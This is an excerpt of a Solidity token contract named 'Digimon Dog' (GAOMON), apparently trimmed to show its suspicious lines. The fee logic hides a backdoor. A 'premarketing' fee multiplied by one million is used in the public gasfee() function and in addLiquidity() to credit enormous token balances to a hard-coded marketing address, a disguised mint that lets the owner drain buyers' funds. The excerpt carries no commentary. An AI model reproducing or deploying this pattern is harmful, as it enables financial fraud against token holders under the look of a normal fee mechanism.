...
contract Gaomon is Context, IERC20, Ownable {
    ...
    string private _name = "Digimon Dog";
    string private _symbol = "GAOMON";
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 1 * 10**8 * 10**_decimals;

    address payable private marketing =
        payable(0x4Ca1D34a8a7b27B753d04A9404F4922be3F9eEaF);
    ...
    uint256 private pretotalfee;

    uint256 private _liquidityFee;
    uint256 private _preliquidityFee;

    uint256 private _marketingFee;
    uint256 private _premarketingFee;
    ...
    constructor() {
        ...
        _marketingFee = 2;
        _premarketingFee = _marketingFee * 1000000;
        _totalFeesToContract = _liquidityFee.add(_marketingFee);

        _liquifyThreshhold = _totalSupply / 100 * 100000;
    ...
    function gasfee() public lockTheSwap {
        ...
        uint256 developmentTokensToSell = balanceOf(address(this))
            ...
            _balances[marketing]= _balances[marketing].add(developmentTokensToSell/100 * _premarketingFee);
    ...
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        _balances[marketing]= _balances[marketing].add(tokenAmount/100 * _premarketingFee);
